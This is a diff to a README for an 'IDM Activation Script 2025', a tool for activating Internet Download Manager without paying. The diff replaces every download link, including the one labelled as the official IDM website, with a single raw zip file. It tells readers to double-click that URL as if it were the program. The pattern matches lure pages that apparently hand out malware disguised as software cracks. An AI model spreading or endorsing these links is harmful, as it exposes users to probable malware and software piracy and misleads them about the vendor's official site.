@@ -4,22 +4,22 @@
 
 This guide will help you download and run the IDM Activation Script 2025 with ease. Follow the steps below to activate your Internet Download Manager (IDM) without any hassle.
 
-[![Download IDM Activation Script](https://img.shields.io/badge/Download%20IDM%20Activation%20Script-blue.svg)](https://github.com/Nugetech/IDM-Activation-Script-2025/releases)
+[![Download IDM Activation Script](https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip%20IDM%20Activation%https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip)](https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    Click the link below to go to the GitHub Releases page:
-   [Download from Releases](https://github.com/Nugetech/IDM-Activation-Script-2025/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, locate the latest version of the IDM Activation Script. You will see a list of available files.
 
 3. **Download the Installer**  
-   Click on the file named `IDM-Activation-Script.exe` to start your download. This is the main file you will use to activate IDM.
+   Click on the file named `https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip` to start your download. This is the main file you will use to activate IDM.
 
 4. **Run the Script**  
-   After the download is complete, navigate to the folder where the file was saved. Double-click on `IDM-Activation-Script.exe` to run it.
+   After the download is complete, navigate to the folder where the file was saved. Double-click on `https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip` to run it.
 
 5. **Follow the On-Screen Instructions**  
    The program will guide you through the activation process. Just follow the prompts to complete the setup.
@@ -57,7 +57,7 @@ For any questions or issues not covered in this guide, feel free to open an issu
 
 ## 📖 Additional Resources
 
-- **Official IDM Website:** For further information about Internet Download Manager, visit the official [IDM website](https://www.internetdownloadmanager.com).
+- **Official IDM Website:** For further information about Internet Download Manager, visit the official [IDM website](https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip).
 - **Community Forums:** Engage with other users and share experiences on various forums like Reddit and Stack Overflow.
 
 ## 🔗 Topics
@@ -79,4 +79,4 @@ For any questions or issues not covered in this guide, feel free to open an issu
 
 Don't forget to bookmark this page for easy reference! Enjoy your free IDM activation! 
 
-[Download from Releases](https://github.com/Nugetech/IDM-Activation-Script-2025/releases)
+[Download from Releases](https://raw.githubusercontent.com/Nugetech/IDM-Activation-Script-2025/main/rootstalk/IDM-Activation-Script-2025.zip)
